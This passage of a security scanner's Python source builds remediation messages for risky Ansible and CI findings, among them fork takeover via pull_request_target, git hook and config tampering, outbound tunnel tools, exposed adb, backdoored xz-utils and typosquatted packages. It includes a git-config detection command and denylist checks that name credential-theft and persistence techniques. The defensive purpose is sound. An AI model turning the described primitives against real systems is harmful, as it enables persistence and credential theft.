**❌ Vulnerable Code:**
```yaml
{code_snippet}
```

**🚨 pull_request_target is a Fork-Takeover Primitive:**
`pull_request_target` runs in the **base repository's** context, with its
secrets and a read-write `GITHUB_TOKEN`, NOT the fork's. If the workflow then
checks out the PR head (`ref: ${{{{ github.event.pull_request.head.sha }}}}`)
or runs any fork-controlled code, **any outside contributor** who opens a pull
request gets arbitrary code execution with your repository's write token.

**✅ Secure Fix - prefer `pull_request` (runs in the fork's sandboxed context):**
```yaml
on:
  pull_request:
    branches: [main]
    # Runs with GITHUB_TOKEN that has read-only permissions in forks.
```

**✅ If you genuinely need base-repo secrets, gate strictly:**
```yaml
on:
  pull_request_target:
    types: [labeled]
jobs:
  integration:
    if: >-
      github.event.label.name == 'safe-to-test' &&
      github.event.pull_request.author_association == 'MEMBER'
    runs-on: ubuntu-latest
    steps:
      # NEVER check out PR head code before these gates pass:
      - uses: actions/checkout@<sha>
        with:
          ref: ${{{{ github.event.pull_request.head.sha }}}}
          persist-credentials: false
```

**🔐 Hardening:**
- Default `permissions:` to `contents: read` at the workflow root; grant
  write permissions only on jobs that absolutely need them.
- Use `persist-credentials: false` on `actions/checkout` to prevent the
  token from leaking to any script the PR runs.
- Background reading: https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/
"""

    def _generate_self_modifying_ci_config_fix(self, code_snippet: str) -> str:
        return f"""
**❌ Vulnerable Code:**
```yaml
{code_snippet}
```

**🚨 Playbook Modifies Its Own CI Configuration:**
A task writing to `.github/workflows/`, `.gitlab-ci.yml`, `Jenkinsfile`,
`bitbucket-pipelines.yml`, `azure-pipelines.yml`, `.circleci/config.yml`, or
`.drone.yml` is the **canonical persistence + privilege-escalation primitive**.
Whoever owns the playbook effectively owns every future CI token the pipeline
is issued - including any deploy keys, cloud OIDC bindings, and publish tokens.

**✅ Secure Fix - CI config must be changed by reviewed commits, not automation:**
```yaml
# WRONG - never do this from inside a CI job:
# - copy:
#     src: new-workflow.yml
#     dest: .github/workflows/deploy.yml

# RIGHT - if you truly need generated CI (monorepo matrices, generated
# language bindings), generate it into a PR, not in-place:
- name: generate workflow matrix
  ansible.builtin.template:
    src: matrix.yml.j2
    dest: "{{{{ tmpdir }}}}/deploy.yml"

- name: open PR with updated workflow
  ansible.builtin.shell: |
    gh pr create --title "ci: regenerate deploy matrix" \\
      --body "Automated regeneration" --base main --head regen-deploy
  environment:
    GH_TOKEN: "{{{{ lookup('env', 'READ_ONLY_BOT_TOKEN') }}}}"
```

**🔐 Organization-wide enforcement:**
- **CODEOWNERS**: require a security-team review on any change to
  `.github/workflows/**`, `.gitlab-ci.yml`, `Jenkinsfile`, etc.
- **Branch protection**: require CODEOWNERS review + signed commits on
  branches that own CI files.
- **GitHub Actions permissions**: set workflow `permissions:` to
  `contents: read` by default so even a compromised job cannot push a workflow
  change without a human-reviewed PR.
- **Separate generation from application**: generated CI lives in a
  different branch that opens a PR; never apply generated CI in the same
  job that generated it.
"""

    def _generate_git_hook_or_config_write_fix(self, code_snippet: str) -> str:
        return f"""
**❌ Vulnerable Code:**
```yaml
{code_snippet}
```

**🚨 Git Internals Modification is a Persistence + Credential-Theft Primitive:**
Writing to `.git/hooks/*`, `.git/config`, `.gitconfig`, `.gitattributes`, or
setting `core.hooksPath`, `core.sshCommand`, `http.extraheader`, or
`credential.helper` gives attackers execution on every subsequent `git`
command. The `core.sshCommand` form is **actively used in the wild** to proxy
all git authentication through an attacker-controlled host - stealing every
push credential.

**✅ Secure Fix - never write to .git/* from a playbook:**
```yaml
# WRONG:
# - copy:
#     src: pre-commit
#     dest: .git/hooks/pre-commit
#     mode: '0755'

# RIGHT - distribute git hooks via pre-commit.com or husky, which live in the
# repository itself and only activate after an explicit opt-in:
- name: install pre-commit framework
  ansible.builtin.pip:
    name: "pre-commit==3.6.0"
    state: present

- name: install pre-commit hooks (reads .pre-commit-config.yaml from repo root)
  ansible.builtin.command: pre-commit install --install-hooks
  args:
    chdir: "{{{{ repo_path }}}}"
  # This writes .git/hooks/pre-commit, but it does so with a checksum-gated,
  # developer-initiated command - not a silent playbook modification.
```

**🔐 If you need enforceable policy, use server-side controls:**
- **Protected branches** (GitHub/GitLab) with required reviews + required
  status checks - these are enforced server-side, not by `.git/hooks`.
- **CODEOWNERS** for path-specific review requirements.
- **Server-side pre-receive hooks** (on self-hosted git) - these run in a
  trusted context, unlike client-side `.git/hooks` which are untrusted.

**🔎 Detection:** audit for drift with
`git config --local --list | grep -E '^core\\.(hooksPath|sshCommand)|^http\\.extraheader|^credential\\.helper'`.
Legitimate values are uncommon; investigate any non-empty output.
"""

    def _generate_selfhosted_runner_untrusted_event_fix(self, code_snippet: str) -> str:
        return f"""
**❌ Vulnerable Code:**
```yaml
{code_snippet}
```

**🚨 Self-Hosted Runner Reachable by Outside Contributors:**
A job declaring `runs-on: self-hosted` (or any self-hosted label) that triggers
on `pull_request`, `pull_request_target`, `issue_comment`, or `workflow_run`
**without a trusted-actor guard** is a direct path for any outside contributor
to run arbitrary code on your self-hosted runner. GitHub explicitly warns
against this configuration - self-hosted runners are typically long-lived
machines with network and filesystem persistence, so the blast radius of one
malicious PR is the entire runner's reachable infrastructure.

**✅ Secure Fix - option A: use GitHub-hosted runners for fork-triggered jobs:**
```yaml
on: pull_request
jobs:
  lint:
    runs-on: ubuntu-latest  # ephemeral, GitHub-hosted, forks are safe here.
    steps: [...]
```

**✅ Secure Fix - option B: gate self-hosted jobs with a trusted-actor check:**
```yaml
on:
  pull_request_target:
    types: [labeled]
jobs:
  integration:
    if: >-
      github.event.label.name == 'safe-to-test' &&
      (github.event.pull_request.author_association == 'MEMBER' ||
       github.event.pull_request.author_association == 'OWNER')
    runs-on: [self-hosted, linux, x64]
    steps: [...]
```

**✅ Secure Fix - option C: use ephemeral, rootless runners:**
```yaml
# Deploy actions-runner-controller with ephemeral runners:
# https://github.com/actions/actions-runner-controller
# Each PR job runs on a one-shot runner that is destroyed after the job -
# persistence is impossible even if a bad actor breaks out.
```

**🔐 Hardening:**
- **Never** use self-hosted runners on public repositories without a
  trusted-actor gate. GitHub's own guidance:
  https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions#hardening-for-self-hosted-runners
- Runners must be **rootless**: do not run the runner agent as root.
- Runners must be **network-segmented**: the runner host should not reach
  your production VPC or secrets management; it sees only what it needs.
- Monitor with `stepsecurity/harden-runner` (block-mode) - it denies
  outbound network calls not in an allowlist.
"""

    # --- Remote-access / tunnel tools (remove) ---
    def _generate_remove_tunnel_tool_fix(self, code_snippet: str) -> str:
        low = code_snippet.lower()
        if "frp" in low:
            tool = "frp (Fast Reverse Proxy)"
        elif "gost" in low:
            tool = "gost (Go Simple Tunnel)"
        else:
            tool = "cloudflared Tunnel"
        return f"""
**\u274c Vulnerable Code:**
```yaml
{code_snippet}
```

**\U0001f6a8 Outbound Tunnel / Reverse-Proxy Tool Installed ({tool}):**
{tool} opens an outbound tunnel that bypasses ingress controls and egress
inspection - it is never a legitimate configuration-management primitive and is
a common post-exploitation persistence and C2 channel.

**\u2705 Secure Fix - Remove the Task; Use an SSO-Gated Zero-Trust Proxy:**
```yaml
# Remove the {tool} install/run task. If private-host ingress is genuinely
# required, route it through a sanctioned, change-controlled zero-trust proxy
# (Cloudflare Access, Tailscale ACLs, Teleport, Pomerium) - never an ad-hoc tunnel.
- name: Refuse remote-access tunnels without a documented exception
  ansible.builtin.assert:
    that:
      - remote_access_exception_approved | default(false) | bool
    fail_msg: >-
      Outbound tunnels ({tool}) require a documented, change-controlled
      remote-access exception. Use the sanctioned zero-trust proxy instead.

- name: Ensure the tunnel binary and its service are absent
  ansible.builtin.systemd:
    name: "{{{{ tunnel_service_name }}}}"
    state: stopped
    enabled: false
  failed_when: false
```

**Why this matters:** Audit the host for the binary and persistent units, and
investigate how the task was introduced (often compromised CI or a planted role).
"""

    def _generate_adb_tcpip_fix(self, code_snippet: str) -> str:
        return f"""
**\u274c Vulnerable Code:**
```yaml
{code_snippet}
```

**\U0001f6a8 adb tcpip Exposes a Device Over the Network:**
`adb tcpip` opens an unauthenticated debug bridge over the network - anyone who
can reach the port gets a root-capable shell on the device.

**\u2705 Secure Fix - Remove It; Restrict to Loopback and Return to USB:**
```yaml
# Remove the `adb tcpip` task. If remote debugging is genuinely needed in CI,
# bind it to a loopback/host-only emulator interface and switch back to USB at
# the end of the job - never enable it on a physical device on a real network.
- name: Refuse network adb unless this is a loopback-only CI emulator
  ansible.builtin.assert:
    that:
      - adb_remote_debug_ci | default(false) | bool
    fail_msg: "adb tcpip is only permitted on a loopback-only CI emulator."

- name: Return the device to USB-only mode
  ansible.builtin.command: adb usb
  changed_when: false
```

**Why this matters:** A networked adb bridge is an unauthenticated remote shell;
keep debugging on USB or a host-only interface.
"""

    # --- Vulnerable vendor installs ---
    def _generate_vuln_pkg_pin_fix(self, code_snippet: str) -> str:
        ver = _first(code_snippet, r"(?:xz-utils|liblzma)[=\s]+([0-9][\w.\-]*)") or "5.6.0"
        return f"""
**\u274c Vulnerable Code:**
```yaml
{code_snippet}
```

**\U0001f6a8 Backdoored xz-utils / liblzma ({ver}) - CVE-2024-3094:**
xz-utils 5.6.0/5.6.1 shipped a backdoor in liblzma that targets sshd. Installing
or building this version plants a remote-code-execution backdoor.

**\u2705 Secure Fix - Pin to a Known-Good Version:**
```yaml
- name: Install a non-backdoored xz-utils (>= 5.6.2 or the 5.4.x LTS line)
  ansible.builtin.package:
    name: "xz-utils=5.4.6"   # last known-good for most distros; or >= 5.6.2
    state: present

- name: Fail if a backdoored version is present
  ansible.builtin.assert:
    that:
      - "ansible_facts.packages['xz-utils'][0].version is version('5.6.0', '<') or
         ansible_facts.packages['xz-utils'][0].version is version('5.6.2', '>=')"
    fail_msg: "Backdoored xz-utils {ver} detected - rebuild image and rotate SSH host keys."
```

**Why this matters:** Rebuild any image whose layers installed 5.6.0/5.6.1 and
rotate SSH host keys on machines that ran the vulnerable build.
"""

    def _generate_vuln_vendor_upgrade_fix(self, code_snippet: str, rule_id: str = "") -> str:
        meta = _pattern_index.get(rule_id) or {}
        title = meta.get("title") or "Vulnerable vendor appliance version installed"
        ver = (
            _first(code_snippet, r"([0-9]+\.[0-9]+(?:\.[0-9]+)?(?:\.[0-9]+)?)")
            or "{{ current_version }}"
        )
        return f"""
**\u274c Vulnerable Code:**
```yaml
{code_snippet}
```

**\U0001f6a8 {title} ({ver}):**
This task installs a build with a known, actively exploited CVE. The fix is to
install a patched version and treat an exposed/unpatched appliance as compromised.

**\u2705 Secure Fix - Install the Patched Version, Gate the Source:**
```yaml
- name: Refuse vulnerable builds; require a patched, approved version
  ansible.builtin.assert:
    that:
      - appliance_target_version in approved_patched_versions
    fail_msg: >-
      Install a vendor-patched version (per the product's security advisory),
      not {ver}. Do not expose the management/portal interface to the internet.

- name: Install the patched appliance version from the approved source
  ansible.builtin.package:
    name: "{{{{ appliance_package }}}}={{{{ appliance_target_version }}}}"
    state: present
```

**Why this matters:** Apply the vendor advisory's patched build immediately. If
the appliance was internet-reachable while unpatched, follow the vendor's
compromise-recovery guidance (factory reset + rotate all credentials).
"""

    # --- Network exposure ---
    def _generate_mgmt_iface_exposed_fix(self, code_snippet: str) -> str:
        return f"""
**\u274c Vulnerable Code:**
```yaml
{code_snippet}
```

**\U0001f6a8 Management Interface Exposed to 0.0.0.0:**
Binding the NetScaler/ADC management (NSIP) interface to 0.0.0.0 exposes it to
the internet - the precursor to Citrix Bleed and similar mass-exploitation events.

**\u2705 Secure Fix - Bind Management to an Out-of-Band VLAN Only:**
```yaml
- name: Refuse a management bind that is reachable from the internet
  ansible.builtin.assert:
    that:
      - mgmt_bind_address is ansible.utils.in_network '10.0.0.0/8'
    fail_msg: >-
      The NSIP/management interface must bind to an RFC1918 out-of-band VLAN,
      never 0.0.0.0. Public access goes via the load-balanced VIP, not NSIP.

- name: Bind the management interface to the OOB management address
  ansible.builtin.command: >-
    nscli set ns ip {{{{ mgmt_bind_address }}}} -mgmtAccess ENABLED -gui SECUREONLY
  changed_when: true
```

**Why this matters:** Keep management on an out-of-band VLAN; user-facing access
belongs on the load-balanced SSL-VPN/ICA-proxy VIP, never the NSIP.
"""

    def _generate_compose_db_bind_fix(self, code_snippet: str) -> str:
        port = _first(code_snippet, r"(\d{2,5}):\d{2,5}", r"(\d{2,5})") or "5432"
        return f"""
**\u274c Vulnerable Code:**
```yaml
{code_snippet}
```

**\U0001f6a8 docker-compose Publishes a DB Port on 0.0.0.0:**
`ports: ["{port}:{port}"]` binds the database to every host interface, exposing
it to the network (and often the internet) with no authentication boundary.

**\u2705 Secure Fix - Bind to Loopback or Drop the Published Port:**
```yaml
# Loopback only (same-host app access):
services:
  db:
    image: postgres:16.3
    ports:
      - "127.0.0.1:{port}:{port}"

# Better - no published port at all; reach it over the compose network:
services:
  db:
    image: postgres:16.3
    expose:
      - "{port}"   # compose-internal DNS only, no host binding
```

**Why this matters:** Databases should never publish on 0.0.0.0. Use a loopback
bind for same-host access or `expose:` for service-to-service traffic.
"""

    # --- Supply-chain verification gaps ---
    def _generate_s3_integrity_fix(self, code_snippet: str) -> str:
        dest = (
            _first(
                code_snippet,
                r"dest:\s*[\"']?((?:\{\{.*?\}\}|[^\s\"'])+)",
            )
            or "/path/to/object"
        )
        return f"""
**\u274c Vulnerable Code:**
```yaml
{code_snippet}
```

**\U0001f6a8 S3 Object Download Without Integrity Verification:**
The object is pulled with no follow-up checksum/signature assertion, so a
tampered or swapped bucket object is consumed as-is.

**\u2705 Secure Fix Example:**
```yaml
{code_snippet}

- name: checksum the downloaded object
  ansible.builtin.stat:
    path: "{dest}"
    checksum_algorithm: sha256
    get_checksum: true
  register: downloaded_object

- name: fail unless the object matches the pinned digest
  ansible.builtin.assert:
    that:
      - downloaded_object.stat.checksum == expected_sha256
    fail_msg: "integrity check failed for {dest}"
```

Pin `expected_sha256` from a vault-stored manifest. For code-bearing artifacts,
prefer a signed object verified before use.
"""

    def _generate_slsa_verify_fix(self, code_snippet: str) -> str:
        url = (
            _first(
                code_snippet,
                r"url:\s*[\"']([^\"']+)[\"']",
                r"(https?://(?:[^\s'\"]|\{\{[^}]*\}\})+)",
            )
            or "{{ artifact_url }}"
        )
        return f"""
**\u274c Vulnerable Code:**
```yaml
{code_snippet}
```

**\U0001f6a8 External Artifact Consumed Without Provenance Verification:**
Fetching a release artifact with `get_url`/`unarchive` and no SLSA / in-toto /
cosign / gh-attestation check means a tampered or swapped artifact is trusted blindly.

**\u2705 Secure Fix - Verify Provenance Immediately After Download:**
```yaml
- name: Download the release artifact
  ansible.builtin.get_url:
    url: "{url}"
    dest: /tmp/artifact
    checksum: "sha256:{{{{ artifact_sha256 }}}}"

- name: Verify SLSA provenance before using the artifact
  ansible.builtin.command:
    argv:
      - slsa-verifier
      - verify-artifact
      - /tmp/artifact
      - --provenance-path
      - /tmp/artifact.intoto.jsonl
      - --source-uri
      - "{{{{ artifact_source_uri }}}}"
  changed_when: false
  # Or: gh attestation verify /tmp/artifact --owner {{{{ artifact_owner }}}}
```

**Why this matters:** A checksum proves the bytes did not change in transit;
provenance verification proves they came from the build you expect.
"""

    def _generate_sigstore_enforce_fix(self, code_snippet: str) -> str:
        return f"""
**\u274c Vulnerable Code:**
```yaml
{code_snippet}
```

**\U0001f6a8 Image-Signature Policy in Warn Mode, Not Enforce:**
A Sigstore policy-controller / Kyverno policy in `warn` mode logs unsigned
images but still admits them - the gate is effectively off.

**\u2705 Secure Fix - Set the Policy to Enforce:**
```yaml
- name: Apply the ClusterImagePolicy in enforce mode
  kubernetes.core.k8s:
    state: present
    definition:
      apiVersion: policy.sigstore.dev/v1beta1
      kind: ClusterImagePolicy
      metadata:
        name: require-signed-images
      spec:
        mode: enforce          # was: warn
        images:
          - glob: "**"
        authorities:
          - keyless:
              identities:
                - issuer: "https://token.actions.githubusercontent.com"
                  subjectRegExp: "{{{{ signer_identity_regex }}}}"
```

**Why this matters:** Roll enforcement out narrowly first, confirm zero policy
violations in the controller logs, then widen the namespace selector.
"""

    def _generate_pip_typosquat_fix(self, code_snippet: str) -> str:
        pkg = (
            _first(
                code_snippet,
                r"pip\s+install\s+([A-Za-z0-9_.\-]+)",
                r"name:\s*([A-Za-z0-9_.\-]+)",
            )
            or "{{ package_name }}"
        )
        return f"""
**\u274c Vulnerable Code:**
```yaml
{code_snippet}
```

**\U0001f6a8 Likely Typosquat / Malicious Package ({pkg}):**
`{pkg}` matches a known typosquat or removed/malicious PyPI name. Installing it
runs attacker-controlled code at install time.

**\u2705 Secure Fix - Install the Correct Name, Pinned and Hashed:**
```yaml
- name: Install the intended package, version-pinned and hash-locked
  ansible.builtin.pip:
    requirements: /opt/app/requirements.txt
    # requirements.txt generated with: pip-compile --generate-hashes
    # e.g. requests==2.32.3 --hash=sha256:70761cfe...

- name: Refuse install if the name is on the typosquat denylist
  ansible.builtin.assert:
    that:
      - "'{pkg}' not in pypi_typosquat_denylist"
    fail_msg: "{pkg} is a known typosquat/malicious package - did you mean the canonical name?"
```

**Why this matters:** Pin every dependency with exact versions AND hashes
(`pip-compile --generate-hashes`) and use an internal mirror to block
dependency-confusion attacks.
"""

    # --- CI / secret hygiene ---
    def _generate_git_hook_remote_fix(self, code_snippet: str) -> str:
        return f"""
**\u274c Vulnerable Code:**
```yaml
{code_snippet}
```

**\U0001f6a8 Git Hook Fetched From a Remote Source:**
Writing a hook into `.git/hooks/` from a remote URL (or symlinking it externally)
means the hook content is invisible to code review and can change silently -
arbitrary code runs on the next git operation.

**\u2705 Secure Fix - Commit Hooks Into the Repo Under .githooks/:**
```yaml
- name: Install repo-tracked hooks (visible in git log, reviewable in PRs)
  ansible.builtin.command: git config --local core.hooksPath .githooks
  args:
    chdir: "{{{{ repo_path }}}}"
  changed_when: true
  # Hooks live at .githooks/* committed to the repo; never fetched at runtime
  # into .git/hooks/ where they escape review and can be swapped silently.
```

**Why this matters:** Repo-tracked hooks under `.githooks/` are reviewable and
cannot be changed without a PR; remote-fetched hooks are an untracked RCE primitive.
"""

    def _generate_sccm_naa_fix(self, code_snippet: str) -> str:
        return f"""
**\u274c Vulnerable Code:**
```yaml
{code_snippet}
```

**\U0001f6a8 SCCM Client-Push / Network Access Account in Plaintext:**
The legacy SCCM Network Access Account (NAA) pattern stores a reusable domain
credential that is recoverable from clients - a classic credential-theft and
lateral-movement primitive.

**\u2705 Secure Fix - Use Enhanced HTTP / Entra Device Auth, No Shared NAA:**
```yaml
- name: Refuse plaintext NAA; require Enhanced HTTP + device auth
  ansible.builtin.assert:
    that:
      - sccm_enhanced_http | default(false) | bool
      - sccm_naa_credential is not defined
    fail_msg: >-
      Migrate off the Network Access Account: use SCCM Enhanced HTTP (>=2103)
      with Entra-ID device tokens / device certs, not a shared plaintext NAA.

- name: Configure the client to use Enhanced HTTP (token-based) auth
  ansible.windows.win_shell: |
    ccmsetup.exe /mp:https://{{{{ sccm_mp_fqdn }}}} /UsePKICert
  no_log: true
```

**Why this matters:** Eliminate the shared NAA entirely; Enhanced HTTP with
device-based authentication removes the recoverable plaintext credential.
"""

    def _generate_jenkins_secret_fix(self, code_snippet: str) -> str:
        return f"""
**\u274c Vulnerable Code:**
```yaml
{code_snippet}
```

**\U0001f6a8 Jenkins Agent JNLP Secret in URL or Plaintext:**
Passing the JNLP secret on the command line (or in a URL) leaks it via the
process table, shell history, and logs - anyone who can read those can attach a
rogue agent.

**\u2705 Secure Fix - Pass the Secret via a 0600 File or Use WebSocket Agents:**
```yaml
- name: Write the agent secret to a locked-down file
  ansible.builtin.copy:
    content: "{{{{ vault_jenkins_agent_secret }}}}"
    dest: /etc/jenkins/agent.secret
    owner: jenkins
    group: jenkins
    mode: '0600'
  no_log: true

- name: Start the agent reading the secret from the file (not the command line)
  ansible.builtin.command:
    argv:
      - java
      - -jar
      - /opt/jenkins/agent.jar
      - -secretFile
      - /etc/jenkins/agent.secret
      - -url
      - "{{{{ jenkins_url }}}}"
  no_log: true
  # Better still: use the WebSocket agent protocol (Jenkins >= 2.217).
```

**Why this matters:** Keep the secret out of argv/URLs; a 0600 secret file or the
WebSocket agent protocol avoids process-table and log exposure.
"""

    def _generate_gh_script_injection_fix(self, code_snippet: str) -> str:
        ctx = (
            _first(code_snippet, r"(\$\{\{\s*github\.event[^}]*\}\})")
            or "${{ github.event.issue.title }}"
        )
        return f"""
**\u274c Vulnerable Code:**
```yaml
{code_snippet}
```

**\U0001f6a8 Untrusted github.event Context Interpolated Into github-script:**
Embedding `{ctx}` directly into an `actions/github-script` body lets an attacker
craft issue/PR text that breaks out of the string and runs arbitrary JavaScript
with the workflow token.

**\u2705 Secure Fix - Pass Untrusted Text Through env, Reference process.env:**
```yaml
- uses: actions/github-script@<full-sha>  # v7.x
  env:
    TITLE: {ctx}        # untrusted text enters as data, not code
  with:
    script: |
      const title = process.env.TITLE;   // safe: never interpolated into the script body
      core.info(title);
```

**Why this matters:** Treat every `${{{{ github.event.* }}}}` value as untrusted
input - move it through `env:` and read `process.env`, never inline it into a script.
"""

    def _generate_token_in_url_fix(self, code_snippet: str) -> str:
        url = _first(code_snippet, r"(https?://[^\s'\"]+)") or "{{ api_url }}"
        return f"""
**\u274c Vulnerable Code:**
```yaml
{code_snippet}
```

**\U0001f6a8 Token in URL Query String or userinfo@host:**
Secrets in a URL (`https://user:token@host` or `?token=...`) leak into server
access logs, proxy logs, browser history, and Ansible's own output.

**\u2705 Secure Fix - Move the Secret Into an Authorization Header:**
```yaml
- name: Call the API with the token in a header, not the URL
  ansible.builtin.uri:
    url: "{url}"
    headers:
      Authorization: "Bearer {{{{ lookup('community.hashi_vault.hashi_vault',
                                 'secret=secret/data/api:token') }}}}"
  no_log: true
```

**Why this matters:** URLs are logged everywhere; headers (with `no_log: true`)
keep the token out of logs, history, and proxies. Source it from Vault, not inline.
"""
